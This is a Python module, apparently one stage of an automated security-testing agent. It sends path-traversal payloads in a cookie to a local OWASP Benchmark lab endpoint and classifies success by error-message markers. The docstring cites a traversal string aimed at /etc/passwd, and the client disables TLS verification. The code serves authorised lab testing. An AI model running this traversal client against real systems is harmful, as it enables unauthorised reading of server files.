"""
FASE 6 — Agente de Ataque Real (attack_node).

Ejecuta el payload aprobado (por EJECUCION_AUTOMATICA directa o por HITL)
contra un laboratorio autorizado real: OWASP Benchmark, corriendo en local
vía Docker (contenedor `owasp-benchmark`, https://127.0.0.1:8443).

Caso de prueba fijado: pathtraver-00 / BenchmarkTest00001 — un endpoint de
path traversal real y documentado del propio suite OWASP Benchmark, cuyo
código fuente (BenchmarkJava) confirma que el valor de la cookie
`BenchmarkTest00001` se concatena sin sanitizar a una ruta base y se abre
con `FileInputStream`. Verificado manualmente antes de automatizarlo:

    - Valor inocuo ("test123")            -> "No such file or directory"
    - Traversal real ("../../.../etc/passwd") -> "offset 0, count -1, length 1000"

La distinción de mensajes de error es la señal de evidencia que este módulo
usa para clasificar el resultado — nunca asume éxito solo por HTTP 200.
"""

from __future__ import annotations

from dataclasses import dataclass

import aiohttp

BENCHMARK_BASE_URL = "https://127.0.0.1:8443"
BENCHMARK_TEST_PATH = "/benchmark/pathtraver-00/BenchmarkTest00001"
BENCHMARK_COOKIE_NAME = "BenchmarkTest00001"

# Fragmento de respuesta cuando el path solicitado NO existe (payload
# sanitizado o inocuo) — confirmado empíricamente contra el lab real.
_NOT_FOUND_MARKER = "No such file or directory"
# Fragmento de respuesta cuando el FileInputStream SÍ localizó el archivo
# (la traversal funcionó) pero el endpoint falla al leerlo como imagen.
_FOUND_MARKER = "Problem getting FileInputStream"


@dataclass
class AttackResult:
    target_url: str
    payload: str
    http_status: int
    response_snippet: str
    exploited: bool  # True si la evidencia de la respuesta confirma traversal real
    rationale: str


class RealAttackClient:
    """Cliente HTTP mínimo contra el laboratorio OWASP Benchmark autorizado."""

    def __init__(self, base_url: str = BENCHMARK_BASE_URL, timeout_seconds: float = 10.0) -> None:
        self._base_url = base_url
        self._timeout = aiohttp.ClientTimeout(total=timeout_seconds)

    async def execute(self, payload: str) -> AttackResult:
        url = f"{self._base_url}{BENCHMARK_TEST_PATH}"
        cookies = {BENCHMARK_COOKIE_NAME: payload}

        # verify_ssl=False: el laboratorio usa un certificado autofirmado local;
        # esto NUNCA debe hacerse contra un objetivo real fuera del lab.
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(timeout=self._timeout, connector=connector) as session:
            async with session.post(
                url,
                cookies=cookies,
                data={BENCHMARK_COOKIE_NAME: "safe"},
            ) as response:
                status = response.status
                body = await response.text()

        snippet = body.strip()[:300]

        if _NOT_FOUND_MARKER in body:
            exploited = False
            rationale = "El servidor no localizó el archivo objetivo: payload sanitizado o ruta inválida."
        elif _FOUND_MARKER in body:
            exploited = True
            rationale = (
                "El servidor localizó y abrió el archivo fuera del directorio base "
                "(FileInputStream no lanzó 'No such file or directory') -> path traversal confirmado."
            )
        else:
            exploited = False
            rationale = "Respuesta no reconocida por los marcadores de evidencia conocidos; no se asume éxito."

        return AttackResult(
            target_url=url,
            payload=payload,
            http_status=status,
            response_snippet=snippet,
            exploited=exploited,
            rationale=rationale,
        )
